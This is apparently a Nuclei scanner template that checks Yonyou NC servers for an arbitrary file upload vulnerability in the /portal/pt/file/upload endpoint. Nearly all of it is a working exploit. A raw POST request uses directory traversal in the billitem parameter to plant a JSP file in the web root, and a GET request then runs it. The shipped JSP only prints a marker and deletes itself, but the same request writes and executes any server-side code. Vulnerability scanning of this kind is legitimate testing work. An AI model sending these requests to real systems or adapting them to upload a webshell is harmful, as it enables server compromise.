id: yongyou-nc-FileManager-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: NC系统可利用/portal/pt/file/upload 接口中的 filename 参数及 billitem 参数实现任意文件上传，从而控制服务器
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC%E7%B3%BB%E7%BB%9FFileManager%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
variables:
  filename: "{{rand_base(6)}}"  
http:
  - raw:
      - |-
        POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305
        Content-Length: 196

        --d0b7a0d40eed0e32904c8017b09eb305
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
        Content-Type: text/plain

        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        --d0b7a0d40eed0e32904c8017b09eb305--
      - |
        GET /{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: body
        words:
          - 'e165421110ba03099a1c0393373c5b43'
